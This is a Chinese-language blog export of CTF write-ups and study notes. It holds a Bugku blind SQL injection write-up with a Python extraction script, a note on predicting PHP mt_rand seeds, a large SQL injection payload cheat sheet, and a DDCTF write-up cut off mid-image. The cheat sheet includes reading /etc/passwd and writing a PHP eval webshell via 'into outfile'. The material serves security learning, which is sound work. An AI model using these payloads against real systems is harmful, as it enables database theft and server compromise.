{"meta":{"title":"chuddy's Blog","subtitle":"keep hungry keep foolish","description":null,"author":"chuddy","url":"http://yoursite.com","root":"/"},"pages":[],"posts":[{"title":"bugku insert into 注入","slug":"bugku-insert-into-注入","date":"2019-05-08T15:42:22.000Z","updated":"2019-05-08T16:13:15.104Z","comments":true,"path":"2019/05/08/bugku-insert-into-注入/","link":"","permalink":"http://yoursite.com/2019/05/08/bugku-insert-into-注入/","excerpt":"INSERT INTO 注入","text":"INSERT INTO 注入 打开题目 已经给出源码 123456789101112131415161718192021222324252627error_reporting(0);function getIp()&#123;$ip = &apos;&apos;;if(isset($_SERVER[&apos;HTTP_X_FORWARDED_FOR&apos;]))&#123;$ip = $_SERVER[&apos;HTTP_X_FORWARDED_FOR&apos;];&#125;else&#123;$ip = $_SERVER[&apos;REMOTE_ADDR&apos;];&#125;$ip_arr = explode(&apos;,&apos;, $ip);return $ip_arr[0];&#125;$host=&quot;localhost&quot;;$user=&quot;&quot;;$pass=&quot;&quot;;$db=&quot;&quot;;$connect = mysql_connect($host, $user, $pass) or die(&quot;Unable to connect&quot;);mysql_select_db($db) or die(&quot;Unable to select database&quot;);$ip = getIp();echo &apos;your ip is :&apos;.$ip;$sql=&quot;insert into client_ip (ip) values (&apos;$ip&apos;)&quot;;mysql_query($sql); 这里可以看出注入点在最后的12$sql=&quot;insert into client_ip (ip) values (&apos;$ip&apos;)&quot;;` $ip 可以通过 X-ForWarded-For 伪造IP 来进行http头注入 由于没有回显 也屏蔽了报错 所以只能考虑基于时间的盲注 之前时间延时盲注都是用的 if(exp1,exp2,exp3) 但是这次 他将’,’ 过滤了12$ip_arr = explode(&apos;,&apos;, $ip);return $ip_arr[0]; 所以用 case when exp1 then sleep(4) else 1 end来绕过 “,”的限制 exp1 中要用到substr来进行剪切，这个函数substr(str,1,1) 又是存在 “,” , 于是这里我又用 substr (str) from 1 for 1 来绕过 “,”的限制 构成的完整语句为1insert into client_ip (ip) values (&apos; 1&apos; and (case when (length((select database())) = 14) then sleep(4) else 1 end) # &apos;) 最后附上脚本：1234567891011121314151617181920212223import requestsurl=&quot;http://123.206.87.240:8002/web15/&quot;flag=&quot;&quot;for i in range(1,6): for str1 in &quot;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_,!@#$%^&amp;*``.&quot;: #data = &quot;11&apos;and (case when (substr((select group_concat(table_name) from information_schema.tables where table_schema=database() ) from &quot; + str(i) + &quot; for 1 )=&apos;&quot; + str1 + &quot;&apos;) then sleep(4) else 1 end )) #&quot; #client_ip,flag #data = &quot;11&apos; and (case when (substr((select group_concat(column_name) from information_schema.columns where table_name=&apos;flag&apos;) from &quot; + str(i) + &quot; for 1 )=&apos;&quot; + str1 + &quot;&apos;) then sleep(4) else 1 end )) #&quot; #flag data = &quot;11&apos; and (case when (substr((select group_concat(flag) from flag) from &quot; + str(i) + &quot; for 1 )=&apos;&quot; + str1 + &quot;&apos;) then sleep(4) else 1 end )) #&quot; headers=&#123;&apos;X-ForWarded-For&apos;:data&#125; try: result=requests.get(url,headers=headers,timeout=3) except requests.exceptions.ReadTimeout: flag+=str1 print flag breakprint flag","categories":[],"tags":[{"name":"writeup","slug":"writeup","permalink":"http://yoursite.com/tags/writeup/"}]},{"title":"php伪随机数","slug":"php伪随机数","date":"2019-05-08T15:10:13.000Z","updated":"2019-05-08T15:38:32.768Z","comments":true,"path":"2019/05/08/php伪随机数/","link":"","permalink":"http://yoursite.com/2019/05/08/php伪随机数/","excerpt":"php伪随机数前言这一段遇到了一个关于伪随机数的题目，当时没有做出来，看完writeup之后，感觉很有意思，所以就记录下来","text":"php伪随机数前言这一段遇到了一个关于伪随机数的题目，当时没有做出来，看完writeup之后，感觉很有意思，所以就记录下来 php伪随机数漏洞php中重要的几个随机函数 rand() 不指定参数时，范围0-32767 md_rand() 不指定参数时，范围0-2^32-1 srand() 给rand()函数播种 mt_srand() 给mt_srand()函数播种 php是基于C开发的，C中生成随机数时，需要自己去一个种子，相同的种子产生的随机数是相同的，php中也一样 自己的理解：mt_scrand(seed)这个函数的意思，是通过分发seed种子，然后种子有了后，靠mt_rand()生成随机数。 所以，当种子一定时，接下来几次的随机数都是固定的 测试代码：123456789&lt;?php mt_srand(1433223);echo mt_rand().&quot;&lt;br&gt;&quot;;echo mt_rand().&quot;&lt;br&gt;&quot;;echo mt_rand().&quot;&lt;br&gt;&quot;;echo mt_rand().&quot;&lt;br&gt;&quot;;echo mt_rand().&quot;&lt;br&gt;&quot;;?&gt; 页面输出：12345206822070220016736074103034094754485011250041484 发现随机种子 确定下来 无论怎么刷新 页面返回的一直是这几个随机数 同时我们应该注意，mt_srand()函数播种的时候，只有在第一次调用mt_rand()函数的时候才会使用。所以如果我们知道了第一次生成的随机数值，就可能爆破出随机数种子。 工具链接： php伪随机数 发现爆出了5个可能的种子通过验证可以知道那个是正确的种子 注意：如果不是第一次生成的随机数，爆出来的种子，不一定正确 在 php &gt; 4.2.0 的版本中，不再需要用 srand() 或 mt_srand() 函数给随机数发生器播种，现已由 PHP 自动完成。php 中产生一系列的随机数时，只进行了一次播种，而不是每次调用 mt_rand() 都进行播种。","categories":[],"tags":[{"name":"web漏洞","slug":"web漏洞","permalink":"http://yoursite.com/tags/web漏洞/"}]},{"title":"sql注入","slug":"sql注入","date":"2019-04-22T08:31:07.000Z","updated":"2019-05-08T15:12:22.967Z","comments":true,"path":"2019/04/22/sql注入/","link":"","permalink":"http://yoursite.com/2019/04/22/sql注入/","excerpt":"","text":"sql注入漏洞前言感觉自己以前学的比较粗糙，这一段打算逐一把学过的漏洞再重新学习一边，加深一下印象。 sql注入简介Sql 注入攻击是通过将恶意的 Sql 查询或添加语句插入到应用的输入参数中，再在后台 Sql 服务器上解析执行进行的攻击，它目前黑客对数据库进行攻击的最常用手段之一。 mysql数据库的知识储备123456789101112mysql数据库中的一些全局变量user() 当前用户version() 数据库版本database() 当前数据库名@@version_compile_os 当前的操作系统数据库中常见的注释符：1. -- 后面有一个空格2. /*...*/3. # 在MySQL中有一个叫做information_schema的库，它存储着所有表的信息 虽然里面有这么多的表，常用的不是特别多 schemata、TABLES、COLUMNS schemata表，这个便存储了mysql数据库的所有库名 tables表里面包含了数据库中的所有的表名 COLUMNS表中存储了所有表的字段信息 一些常用的查找语句 12345678910111213141516所有用户select group_concat(user) from mysql.user用户hash:select group_concat(password) from mysql.user where user=&apos;root&apos;所有数据库：select group_concat(schema_name) from information_schema.schemata表名：select group_concat(table_name) from information_schema.tables where table_schema=&apos;库名&apos;//表中有主码约束，非空约束等完整性约束条件的才能用这个语句查询出来select group_concat(table_name) from information_schema.table_constraints where table_schema=&apos;库名&apos;字段名：select group_concat(column_name) from information_schema.columns where table_name=&apos;表名&apos;读文件：select load_file(&apos;/etc/passwd&apos;)写文件：select &lt;?php @eval($_POST[&apos;a&apos;]); ?&gt; into outfile &apos;/var/www/html/shell.php&apos; 常见的sql注入类型union注入联合注入也是常见一种注入方式，利用条件页面需要有回显位。 猜字段的长度页面有回显的情况下可以通过：order by 来猜测字段的长度 1id=1&apos; order by 3-- 猜字段的位置如果已经知道字段的长度为3的话可以通过联合查询来爆出字段的位置 1id=-1&apos; union select 1,2,3-- 基本语法1union select 1,flag,3 from flag 过滤了逗号的联合注入1234567mysql&gt; select * from user1 where id=-1 union select * from (select version())a join (select database())b join (select database())c;+--------+------+------+| id | name | pass |+--------+------+------+| 5.5.53 | test | test |+--------+------+------+1 row in set (0.04 sec) 报错注入mysql数据库的报错注入方法整理， floor UpdateXml ExtractValue NAME_CONST Error based Double Query Injection … floor123456?id=1 OR (SELECT 8627 FROM(SELECT COUNT(*),CONCAT(0x6368756464797e,(SELECT user()),0x7e636875646479,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)操作：mysql&gt; select * from user where id=1 OR (SELECT 8627 FROM(SELECT COUNT(*),CONCAT(0x6368756464797e,(SELECT user()),0x7e636875646479,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a);ERROR 1062 (23000): Duplicate entry &apos;chuddy~root@localhost~chuddy1&apos; for key &apos;group_key&apos; ExtractValue(有长度限制,最长32位)12345?id=1 and extractvalue(1, concat(0x7e, (select @@version),0x7e))mysql&gt; select * from user where 1 and extractvalue(1, concat(0x7e, (select @@version),0x7e));ERROR 1105 (HY000): XPATH syntax error: &apos;~5.5.53~&apos; 当查询的书库超过32位 可以利用字符串截取函数，多次读取该数据 UpdateXml(有长度限制,最长32位)1?id=1 and updatexml(1,concat(0x7e,(SELECT @@version),0x7e),1) 利用方式和ExtractValue方式差不多，当查询的书库超过32位 可以利用字符串截取函数，多次读取该数据 NAME_CONST(适用于低版本，不太好用)1?id=261 and 1=(select * from (select NAME_CONST(version(),1),NAME_CONST(version(),1)) as x) Error based Double Query Injection1?id=1 or 1 group by concat_ws(0x7e,version(),floor(rand(0)*2)) having min(0) or 1 exp(5.5.5以上)1?id=1 and (select exp(~(select * from(select user())x))) polygon12mysql&gt; select * from user where name = &quot;&quot; and polygon(pass);ERROR 1367 (22007): Illegal non geometric &apos;`test`.`user`.`pass`&apos; value found during parsing 布尔盲注基本语法1id = 1 and ascii(substr((select database()),1,1))&gt;97--+ 由于Mysql4之后对大小写就不敏感，可以使用binary()函数使大小写敏感。 构造布尔条件的骚姿势1234567891011121314151617181920212223//正常情况&apos;or bool#true&apos;and bool# //不使用空格、注释&apos;or(bool)=&apos;1true&apos;and(bool)=&apos;1 //不使用or、and、注释&apos;^!(bool)=&apos;1&apos;=(bool)=&apos;&apos;||(bool)=&apos;1true&apos;%26%26(bool)=&apos;1 //%26就是&amp;&apos;=if((bool),1,0)=&apos;0&apos;-(bool)-&apos;&apos;^(bool)^&apos; //不使用等号、空格、注释&apos;or(bool)&lt;&gt;&apos;0&apos;or((bool)in(1))or&apos;0 //其他or (case when (bool) then 1 else 0 end) 构造逻辑判断常见的逻辑判断函数 12345678910111213141516171819字符串的截取函数：left(user(),1)&gt;&apos;c&apos;right(user(),1)&gt;&apos;c&apos;substr(user(),1,1)&gt;&apos;c&apos;mid(user(),1,1)=&apos;c&apos;查询字符串的长度:length(&apos;chuddy&apos;) 查询字符的ascii码：ord(&apos;a&apos;)ascii(&apos;a&apos;)ascii转换字符:char(97)布尔盲注的基本语法：ascii(substr((查询的sql语句),1,1))&gt;97 一些绕过方式12345678910111213141516过滤了空格可以一下代替/*1*/%20%a0过滤了 = like&lt;&gt;regexp 过滤了一些关键词可以大小写绕过unIon、seLect、如果关键词被替换位空白 可以双写绕过selselectect、 uniunionon 特殊的盲注方法: 利用order by 盲注12345678910111213141516----+----------+----------------------------------+| id | username | password |+----+----------+----------------------------------+| 1 | 2 | 5 || 1 | admin | 51b7a76d51e70b419f60d3473fb6f900 |+----+----------+----------------------------------+2 rows in set (0.00 sec) mysql&gt; select * from admin where username=&apos;&apos; or 1 union select 1,2,&apos;6&apos; order by 3;+----+----------+----------------------------------+| id | username | password |+----+----------+----------------------------------+| 1 | admin | 51b7a76d51e70b419f60d3473fb6f900 || 1 | 2 | 6 |+----+----------+----------------------------------+2 rows in set (0.01 sec) 过滤很严格的话 可以通过一些其他它方式爆破密码 12345678910mysql&gt; select * from user1 where name=&quot;user4&quot; &amp;&amp; pass&gt;&apos;a1&apos;;+------+-------+--------+| id | name | pass |+------+-------+--------+| 4 | user4 | a1b2c3 |+------+-------+--------+1 row in set (0.00 sec)mysql&gt; select * from user1 where name=&quot;user4&quot; &amp;&amp; pass&gt;&apos;a2&apos;;Empty set (0.00 sec) 跨表查询数据12345678910mysql&gt; select * from user1 where id =1 and (select a.pass&lt;&apos;7&apos; from user a limit 1);+------+-------+------+| id | name | pass |+------+-------+------+| 1 | user1 | 123 |+------+-------+------+1 row in set (0.00 sec)mysql&gt; select * from user1 where id =1 and (select a.pass&gt;&apos;7&apos; from user a limit 1);Empty set (0.00 sec) 延时注入相交于bool盲注，就是把返回值0和1改为是否延时的标准，一般格式为：if((bool),sleep(5),0)和or (case when (bool) then sleep(5) else 0 end) 延时函数：123BENCHMARK(100000,MD5(1))sleep BENCHMARK()用于测试函数的性能，参数一为次数，二为要执行的表达式。可以让函数执行若干次，返回结果比平时要长，通过时间长短的变化，判断语句是否执行成功。这是一种边信道攻击，在运行过程中占用大量的cpu资源。推荐使用sleep() 如果着两个函数被ban了可以利用笛卡儿积造成延迟来进行注入 1&apos; and if(ascii(substr((select database()),%d,1))&lt;%d,(SELECT count(*) FROM information_schema.columns A, information_schema.columns B,information_schema.tables C),1)# insert和uodate注入123456789101112131415161718//insert 的报错注入mysql&gt; insert into user2 values(null,&apos;a&apos; and extractvalue(1, concat(0x7e, (select @@version),0x7e)));ERROR 1105 (HY000): XPATH syntax error: &apos;~5.5.53~&apos;mysql&gt; insert into user2 values(null,&apos;a&apos; and extractvalue(1, concat(0x7e, (select database()),0x7e)));ERROR 1105 (HY000): XPATH syntax error: &apos;~y1~&apos;//update的报错注入mysql&gt; update user2 set name=&apos;a&apos; where pass=&apos;a&apos; and extractvalue(1, concat(0x7e, (select @@version),0x7e));ERROR 1105 (HY000): XPATH syntax error: &apos;~5.5.53~&apos;mysql&gt; update user2 set name=&apos;a&apos; where pass=&apos;a&apos; and extractvalue(1, concat(0x7e, (select database()),0x7e));ERROR 1105 (HY000): XPATH syntax error: &apos;~y1~&apos;//insert 延时注入 database为y1mysql&gt; insert into user2(name,pass) values(&apos;a&apos;, mid((select database()),1,1)=&quot;1&quot; or sleep(3));Query OK, 1 row affected (3.00 sec)mysql&gt; insert into user2(name,pass) values(&apos;a&apos;, mid((select database()),1,1)=&quot;y&quot; or sleep(3));Query OK, 1 row affected (0.00 sec) 如果存在insert或者update,更新后的数据是可见的话,那么利用mysql中字符串在与数字进行运算的时候当作是0进行运算 1234567mysql&gt; select &apos;&apos;+1;+------+| &apos;&apos;+1 |+------+| 1 |+------+1 row in set (0.00 sec) 那么我们可以利用查询的数据转化为10进制,然后进行运算,拿到我们计算的结果,在进行转化回去即可 insert into 情况下：123456789101112131415161718mysql&gt; insert into user(id,name,pass) values(&apos;7&apos;,&apos;chuddy&apos;,&apos;&apos;+conv(hex(substr(database(),1 + (1-1) * 6,6)),16,10));Query OK, 1 row affected (0.00 sec)mysql&gt; select * from user where id=7;+------+--------+------------+| id | name | pass |+------+--------+------------+| 7 | chuddy | 1952805748 |+------+--------+------------+1 row in set (0.00 sec)mysql&gt; select unhex(conv(1952805748,10,16));+-------------------------------+| unhex(conv(1952805748,10,16)) |+-------------------------------+| test |+-------------------------------+1 row in set (0.00 sec) update 情况下：12345678910111213141516171819mysql&gt; update user set pass=&apos;&apos;+conv(hex(substr(user(),1 + (1-1) * 6,6)),16,10) where id=3;Query OK, 1 row affected (0.11 sec)Rows matched: 1 Changed: 1 Warnings: 0mysql&gt; select * from user where id =3;+------+-------------+-----------------+| id | name | pass |+------+-------------+-----------------+| 3 | ccccccccccc | 125822936825964 |+------+-------------+-----------------+1 row in set (0.04 sec)mysql&gt; select unhex(conv(125822936825964,10,16));+------------------------------------+| unhex(conv(125822936825964,10,16)) |+------------------------------------+| root@l |+------------------------------------+1 row in set (0.00 sec) order by 注入报错注入常见的利用方式： order by 1 and extractvalue(1, concat(0x7e, (select @@version),0x7e)) 1234mysql&gt; select * from user order by 1 and extractvalue(1, concat(0x7e, (select @@version),0x7e));ERROR 1105 (HY000): XPATH syntax error: &apos;~5.5.53~&apos;mysql&gt; select * from user order by 1 and extractvalue(1, concat(0x7e, (select database()),0x7e));ERROR 1105 (HY000): XPATH syntax error: &apos;~test~&apos; 盲注盲注的基本操作\\order by IF((bool),1,(select 1 union select 2))12345678910111213141516mysql&gt; select * from user order by if((substr(database(),1,1)&lt;&apos;a&apos;),1,(select 1 union select 2));ERROR 1242 (21000): Subquery returns more than 1 rowmysql&gt; select * from user order by if((substr(database(),1,1)&gt;&apos;a&apos;),1,(select 1 union select 2));+------+---------------+-----------------------+| id | name | pass |+------+---------------+-----------------------+| 1 | aaaaaaaaaa | 123 || 2 | bbbbbbbbbbbbb | 456 || 3 | ccccccccccc | 3.2210671827446896e16 || 4 | dddddddddddd | 258 || 5 | eeeeeeeee | 159 || NULL | | NULL || 6 | cccc | 58 || 7 | chuddy | 1952805748 |+------+---------------+-----------------------+8 rows in set (0.02 sec) 延时注入不推荐，因为每条数据都会执行延时，能用其他方法就不使用延时。\\order by IF(1,sleep(3),0); 两条数据就会延时了6秒 宽字节注入原理：在GBK编码时，mysql会认为两个字符是一个汉字（在前一个字节的ascii码大于128的情况下）。而经过转义之后的单引号&#39;会变为\\&#39;，即%5c%27。构造id=1%df%27%23，在经过转义传递给mysql时，就是id=1%df%5c%27%23，mysql在解析时，会认为%df%5c是一个汉字，而%27就会闭合掉原本sql语句中的（左）单引号，即select xxx from xxx where id=&#39;%df%5c&#39;#&#39;，%23用于注释掉原本sql语句中的（右）单引号。这就是宽字节注入的原理。 注入方式和正常的注入差不多的： %df%27%20union%20select%201,database()--+","categories":[],"tags":[{"name":"web漏洞","slug":"web漏洞","permalink":"http://yoursite.com/tags/web漏洞/"}]},{"title":"didictf writeup","slug":"2019didictf部分writeup","date":"2019-04-22T08:18:10.000Z","updated":"2019-04-22T08:25:56.282Z","comments":true,"path":"2019/04/22/2019didictf部分writeup/","link":"","permalink":"http://yoursite.com/2019/04/22/2019didictf部分writeup/","excerpt":"","text":"2019DDCTF writeupweb滴~打开题目 发现url中的jpg=TmpZMlF6WXhOamN5UlRaQk56QTJOdz09有一点不正常，像是base64加密得到的，尝试发现是flag.jpg先进行base16加密在进行两次base64加密得到的 页面的源代码中是对flag.jpg进行base64加密后输出的1&lt;title&gt;TmpZMlF6WXhOamN5UlRaQk56QTJOdz09&lt;/title&gt;flag.jpg&lt;/br&gt;flag.jpg&lt;/br&gt;&lt;img src=&apos;data:image/gif;base64,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